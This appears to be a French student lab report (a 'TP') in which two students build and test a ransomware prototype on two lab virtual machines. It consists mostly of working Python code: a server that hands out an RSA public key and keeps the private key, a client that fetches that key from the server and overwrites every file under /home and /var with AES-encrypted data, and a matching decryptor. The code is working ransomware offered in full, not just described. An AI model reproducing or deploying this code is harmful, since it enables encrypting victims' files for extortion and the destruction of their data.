# TP
TP Groupe Samy Elandaloussi Diouma Diack

J'ai d'abord créé un script qui liste tous les fichiers de mon système 
qui se nomme en pièce joint list_all.py


Puis pour pouvoir savoir le faire j'ai exclu certains fichiers de la liste en l'occurence le dossier /home avec le script suivant list_all_exclued_home.py


Mon serveur est sur l'IP 192.168.146.138 , pour faire des tests j'ai créé une autre machine ubuntu cliente sur l'IP 192.168.146.139

J'ai commencé par vouloir chiffrer un fichier spécifique sur ma machine cliente , /home/crypt_socket/sam_decrypted et dans ce cas spécifique j'ai crée deux scripts sockets qui me permettent de chiffrer en rsa le fichier sam et d'envoyer la clef privée qui me servira au déchiffrement ainsi que le fichier déchiffré sur ma machine serveur , voici les deux scripts sockets , d'abord côté serveur : 

import socket
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes

# Génération de la paire de clés RSA
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# Sérialisation de la clé publique
public_key_serialized = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

# Création du socket serveur
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(('192.168.146.138', 5000))
server_socket.listen(1)
client_socket, addr = server_socket.accept()

# Envoi de la clé publique au client
client_socket.sendall(public_key_serialized)

# Réception des données chiffrées
encrypted_data = b""
while True:
    data = client_socket.recv(4096)
    if not data:
        break
    encrypted_data += data
# Déchiffrement des données
decrypted_data = private_key.decrypt(
    encrypted_data,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
)

# Écriture des données déchiffrées dans un fichier
with open("/home/crypt_socket/sam_decrypted", "wb") as decrypted_file:
    decrypted_file.write(decrypted_data)

# Sérialisation et sauvegarde de la clé privée
private_key_serialized = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
)

with open("/home/crypt_socket/private_key.pem", "wb") as key_file:
    key_file.write(private_key_serialized)

client_socket.close()
server_socket.close()

 Ensuite après avoir lancé ce script côté serveur à l'aide de la commande python3 test_crypt.py , je lance côté client le script suivant , les indications dans le script indique ses actions : 

import socket
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes

# Connexion au serveur
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(('192.168.146.138', 5000))

# Réception de la clé publique du serveur
public_key_serialized = client_socket.recv(4096)
public_key = serialization.load_pem_public_key(public_key_serialized)

# Lecture du fichier à chiffrer
with open("/home/crypt_socket/sam", "rb") as file:
    file_data = file.read()

# Chiffrement du fichier
encrypted_data = public_key.encrypt(
    file_data,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
)

# Écraser le fichier original avec le fichier chiffré
with open("/home/crypt_socket/sam", "wb") as file:
    file.write(encrypted_data)

# Envoi des données chiffrées au serveur
client_socket.sendall(encrypted_data)

client_socket.close()

Voilà j'obtiens bien sur ma machine serveur le fichier sam_decrypted et ma clef  private_key.pem , et le fichier sam sur ma machine cliente est illisible 

Maintenant je vais effectuer la démarche de ne plus chiffrer uniquement un fichier sam mais chiffrer des élèments essentiels à ma machine cliente en l'occurence le dossier /home et le dossier /var , mon script côté serveur 
import socket
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

# Génération de la paire de clés RSA
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# Sérialisation de la clé publique
public_key_serialized = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

# Configuration du socket serveur
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(('192.168.146.138', 5000))
server_socket.listen(1)

print("Serveur en attente de connexion client...")
client_socket, addr = server_socket.accept()
print(f"Connecté à {addr}")

# Envoi de la clé publique au client
client_socket.sendall(public_key_serialized)

# Fermeture des sockets
client_socket.close()
server_socket.close()

# Sauvegarde de la clé privée
private_key_serialized = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
)

with open("/home/crypt_socket/private_key.pem", "wb") as key_file:
    key_file.write(private_key_serialized)



Mon script côté client : 
import os
import socket
import json
import base64
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend

def encrypt_file(file_path, public_key):
    # Générer une clé AES aléatoire et un vecteur d'initialisation (IV)
    key = os.urandom(32)  # Clé AES-256
    iv = os.urandom(16)   # IV pour AES

    # Chiffrer le fichier avec AES
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    with open(file_path, 'rb') as file:
        file_data = file.read()
    encrypted_data = encryptor.update(file_data) + encryptor.finalize()

    # Chiffrer la clé AES avec la clé publique RSA
    encrypted_key = public_key.encrypt(
        key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    # Convertir les données binaires en base64 pour la sérialisation JSON
    encrypted_file_data = {
        'encrypted_key': base64.b64encode(encrypted_key).decode('utf-8'),
        'iv': base64.b64encode(iv).decode('utf-8'),
        'encrypted_data': base64.b64encode(encrypted_data).decode('utf-8')
    }

    # Écraser le fichier original avec les données chiffrées en base64
    with open(file_path, 'wb') as file:
        file.write(json.dumps(encrypted_file_data).encode())

# Se connecter au serveur pour obtenir la clé publique
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(('192.168.146.138', 5000))
public_key_serialized = client_socket.recv(4096)
public_key = serialization.load_pem_public_key(public_key_serialized)

# Chiffrement des fichiers dans /home et /var
directories_to_encrypt = ['/home', '/var']
for directory in directories_to_encrypt:
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, public_key)

client_socket.close()



J'ai maintenant les dossiers /home et /var entièrement chiffrés avec la clef privée uniquement sur mon serveur : 

Pour pouvoir déchiffrer ma machine et dans l'hypothèse ou je le souhaite je peux transférer à mon client ma clef privée en scp /home/crypt_socket/private_key.pem sam@192.168.146.139:/home/sam
et j'informe mon client d'éxecuter le script suivant decrypt.py : 

import os
import json
import base64
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend

def decrypt_file(file_path, private_key):
    with open(file_path, 'rb') as file:
        encrypted_file_data = json.loads(file.read().decode('utf-8'))

    encrypted_key = base64.b64decode(encrypted_file_data['encrypted_key'])
    iv = base64.b64decode(encrypted_file_data['iv'])
    encrypted_data = base64.b64decode(encrypted_file_data['encrypted_data'])

    # Déchiffrer la clé AES avec la clé privée RSA
    key = private_key.decrypt(
        encrypted_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # Déchiffrer les données avec la clé AES
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
    # Déchiffrer les données avec la clé AES
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()

    # Réécrire les données déchiffrées
    with open(file_path, 'wb') as file:
        file.write(decrypted_data)

# Charger la clé privée RSA
with open("/home/sam/private_key.pem", "rb") as key_file:
    private_key = serialization.load_pem_private_key(
        key_file.read(),
        password=None
    )

# Dossiers à déchiffrer
directories_to_decrypt = ['/home', '/var']

for directory in directories_to_decrypt:
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                decrypt_file(file_path, private_key)
            except Exception as e:
                print(f"Erreur lors du déchiffrement de {file_path}: {e}")

Mes données sur ma machine cliente sont entièrement déchiffrées après l'exécution de ce script 

